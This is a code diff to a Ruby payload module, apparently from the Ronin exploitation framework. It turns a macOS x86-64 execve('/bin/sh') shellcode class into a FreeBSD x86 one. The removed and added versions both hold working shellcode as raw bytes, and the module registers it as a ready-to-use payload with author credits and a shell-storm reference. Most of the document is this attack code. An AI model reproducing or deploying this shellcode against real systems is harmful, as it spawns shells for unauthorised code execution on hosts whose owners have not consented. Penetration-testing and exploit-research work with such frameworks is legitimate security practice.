@@ -24,38 +24,36 @@ require 'ronin/payloads/shellcode_payload'
 module Ronin
   module Payloads
     module Shellcode
-      module MacOS
-        module X86_64
+      module FreeBSD
+        module X86
           #
-          # macOS x86-64 shellcode that calls `execve()` with `/bin/sh`.
+          # FreeBSD x86 shellcode that calls `execve()` with `/bin/sh`.
           #
-          class Execve < ShellcodePayload
+          class ExecShell < ShellcodePayload
 
-            register 'shellcode/macos/x86_64/execve'
+            register 'shellcode/freebsd/x86/exec_shell'
 
-            arch :x86_64
-            os :macos
+            arch :x86
+            os :freebsd
 
-            author 'Thireus', twitter: 'Thireus',
-                              blog:    'https://blog.thireus.com/'
+            author 'Tash', email: 'tosh@tuxfamily.org'
 
-            summary 'macOS x86-64 execve() shellcode'
+            summary 'FreeBSD x86 execve() shellcode'
             description <<~DESC
-            macOS x86-64 shellcode that calls execve() with "/bin/sh".
+            FreeBSD x86 shellcode that calls execve() with "/bin/sh".
             DESC
 
             references [
-              "https://blog.thireus.com/execvebinsh-binsh-null-macos-mach-o-x86-64/"
+              "https://shell-storm.org/shellcode/files/shellcode-749.html"
             ]
 
             #
             # Builds the shellcode.
             #
             def build
-              @payload = "\x48\x31\xd2\x48\xc7\xc0\xf6\xff\xff\x01" \
-                         "\x48\x83\xc0\x45\x5f\x52\x57\x48\x89\xe6" \
-                         "\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x62\x69" \
-                         "\x6e\x2f\x2f\x73\x68".b
+              @payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
+                         "\x68\x2f\x62\x69\x6e\x89\xe3\x50" \
+                         "\x54\x53\xb0\x3b\x50\xcd\x80".b
             end
 
           end
